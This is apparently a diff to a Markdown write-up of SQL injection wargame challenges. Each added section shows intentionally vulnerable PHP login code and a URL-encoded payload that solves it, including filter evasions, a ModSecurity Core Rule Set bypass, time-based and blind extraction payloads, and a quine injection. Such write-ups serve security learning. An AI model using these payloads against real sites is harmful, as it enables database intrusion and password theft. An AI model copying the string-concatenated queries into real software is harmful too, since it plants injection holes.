@@ -936,6 +936,148 @@ payload: '),(0,'ip',(select email from prob\_phantom as cc where no = 1 ))%23
 
 payload: 1%27%20union%20SELECT%20REPLACE%28REPLACE%28%271%22%20union%20SELECT%20REPLACE%28REPLACE%28%22%24%22%2CCHAR%2834%29%2CCHAR%2839%29%29%2CCHAR%2836%29%2C%22%24%22%29%20AS%20Quine%23%27%2CCHAR%2834%29%2CCHAR%2839%29%29%2CCHAR%2836%29%2C%271%22%20union%20SELECT%20REPLACE%28REPLACE%28%22%24%22%2CCHAR%2834%29%2CCHAR%2839%29%29%2CCHAR%2836%29%2C%22%24%22%29%20AS%20Quine%23%27%29%20AS%20Quine%23
 
+## Zombie(information\_schema)
+
+```php
+<?php
+  include "./config.php";
+  login_chk();
+  $db = dbconnect("zombie");
+  if(preg_match('/rollup|join|ace|@/i', $_GET['pw'])) exit("No Hack ~_~");
+  $query = "select pw from prob_zombie where pw='{$_GET[pw]}'";
+  echo "<hr>query : <strong>{$query}</strong><hr><br>";
+  $result = @mysqli_fetch_array(mysqli_query($db,$query));
+  if($result['pw']) echo "<h2>Pw : {$result[pw]}</h2>";
+  if(($result['pw']) && ($result['pw'] === $_GET['pw'])) solve("zombie");
+  highlight_file(__FILE__);
+?>
+```
+
+Filter replace
+
+\=> payload : ' union select (select mid(info,38,84) from information\_schema.processlist limit 1)%23
+
+
+
+## Alien(use now)
+
+```php
+<?php
+  include "./config.php";
+  login_chk();
+  $db = dbconnect();
+  if(preg_match('/admin|and|or|if|coalesce|case|_|\.|prob|time/i', $_GET['no'])) exit("No Hack ~_~");
+  $query = "select id from prob_alien where no={$_GET[no]}";
+  echo "<hr>query : <strong>{$query}</strong><hr><br>";
+  $query2 = "select id from prob_alien where no='{$_GET[no]}'";
+  echo "<hr>query2 : <strong>{$query2}</strong><hr><br>";
+  if($_GET['no']){
+    $r = mysqli_fetch_array(mysqli_query($db,$query));
+    if($r['id'] !== "admin") exit("sandbox1");
+    $r = mysqli_fetch_array(mysqli_query($db,$query));
+    if($r['id'] === "admin") exit("sandbox2");
+    $r = mysqli_fetch_array(mysqli_query($db,$query2));
+    if($r['id'] === "admin") exit("sandbox");
+    $r = mysqli_fetch_array(mysqli_query($db,$query2));
+    if($r['id'] === "admin") solve("alien");
+  }
+  highlight_file(__FILE__);
+?>
+```
+
+payload : 1%20union%20select%20concat%28char%2898%2D%28now%28%29%252%29%2D%28sleep%283%29%29%29%2C0x646d696e%29%23%27%20union%20select%20concat%28char%2898%2D%21%28now%28%29%252%29%2D%28sleep%281%29%29%29%2C0x646d696e%29%23
+
+`1 union select concat(char(98-(now()%2)-(sleep(3))),0x646d696e)#' union select concat(char(98-!(now()%2)-(sleep(1))),0x646d696e)#`
+
+## CTHULHU([ModSecurity Core Rule Set v3.1.0](https://github.com/SpiderLabs/owasp-modsecurity-crs/issues/1181))
+
+```php
+<?php
+  include "./welcome.php";
+  include "./config.php";
+  login_chk();
+  $db = dbconnect();
+  if(preg_match('/prob|_|\.|\(\)|admin/i', $_GET[id])) exit("No Hack ~_~");
+  if(preg_match('/prob|_|\.|\(\)|admin/i', $_GET[pw])) exit("No Hack ~_~");
+  $query = "select id from prob_cthulhu where id='{$_GET[id]}' and pw='{$_GET[pw]}'";
+  echo "<hr>query : <strong>{$query}</strong><hr><br>";
+  $result = @mysqli_fetch_array(mysqli_query($db,$query));
+  if($result['id']) solve("cthulhu");
+  highlight_file(__FILE__);
+?>
+```
+
+**payload:** %2D1%27%3C%40%3D1%20OR%20%7Ba%201%7D%3D1%23
+
+
+
+## Death([ModSecurity Core Rule Set v3.1.0](https://github.com/SpiderLabs/owasp-modsecurity-crs/issues/1181))
+
+```php
+<?php
+  include "./config.php"; 
+  login_chk();
+  $db = dbconnect();
+  if(preg_match('/prob|_|\.|\(\)|admin/i', $_GET[id])) exit("No Hack ~_~"); 
+  if(preg_match('/prob|_|\.|\(\)|admin/i', $_GET[pw])) exit("No Hack ~_~"); 
+  $query = "select id from prob_death where id='{$_GET[id]}' and pw=md5('{$_GET[pw]}')"; 
+  echo "<hr>query : <strong>{$query}</strong><hr><br>"; 
+  $result = @mysqli_fetch_array(mysqli_query($db,$query)); 
+  if($result['id'] == 'admin') solve("death");
+  elseif($result['id']) echo "<h2>Hello {$result['id']}<br>You are not admin :(</h2>"; 
+  highlight_file(__FILE__); 
+?>
+```
+
+payload: %2D1%27%3C%40%3D1%20OR%20%7Ba%201%7D%3D1%20limit%201%2C2%23
+
+## Godzilla(error based + modsecurity core rule set v3.1.0)
+
+```php
+<?php
+  include "./config.php";
+  login_chk();
+  $db = dbconnect();
+  if(preg_match('/prob|_|\.|\(\)/i', $_GET[id])) exit("No Hack ~_~");
+  if(preg_match('/prob|_|\.|\(\)/i', $_GET[pw])) exit("No Hack ~_~");
+  $query = "select id from prob_godzilla where id='{$_GET[id]}' and pw='{$_GET[pw]}'";
+  echo "<hr>query : <strong>{$query}</strong><hr><br>";
+  $result = @mysqli_fetch_array(mysqli_query($db,$query));
+  if($result['id']) echo "<h2>Hello admin</h2>";
+   
+  $_GET[pw] = addslashes($_GET[pw]);
+  $query = "select pw from prob_godzilla where id='admin' and pw='{$_GET[pw]}'";
+  $result = @mysqli_fetch_array(mysqli_query($db,$query));
+  if(($result['pw']) && ($result['pw'] == $_GET['pw'])) solve("godzilla");
+  highlight_file(__FILE__);
+?>
+```
+
+payload : 1'<@=1 OR {a ord(mid({pw},{i},1))}={j}%23
+
+
+
+## Cyclops(first second bypass)
+
+```php
+<?php
+  include "./config.php";
+  login_chk();
+  $db = dbconnect();
+  if(preg_match('/prob|_|\.|\(\)/i', $_GET[id])) exit("No Hack ~_~");
+  if(preg_match('/prob|_|\.|\(\)/i', $_GET[pw])) exit("No Hack ~_~");
+  $query = "select id,pw from prob_cyclops where id='{$_GET[id]}' and pw='{$_GET[pw]}'";
+  echo "<hr>query : <strong>{$query}</strong><hr><br>";
+  $result = @mysqli_fetch_array(mysqli_query($db,$query));
+  if(($result['id'] === "first") && ($result['pw'] === "second")) solve("cyclops");//must use union select
+  highlight_file(__FILE__);
+?>
+```
+
+payload : id=1'%23\&pw=%0Aunion/\*\*/select 0x6669727374, 0x7365636f6e64''%23
+
+
+
 
 
 
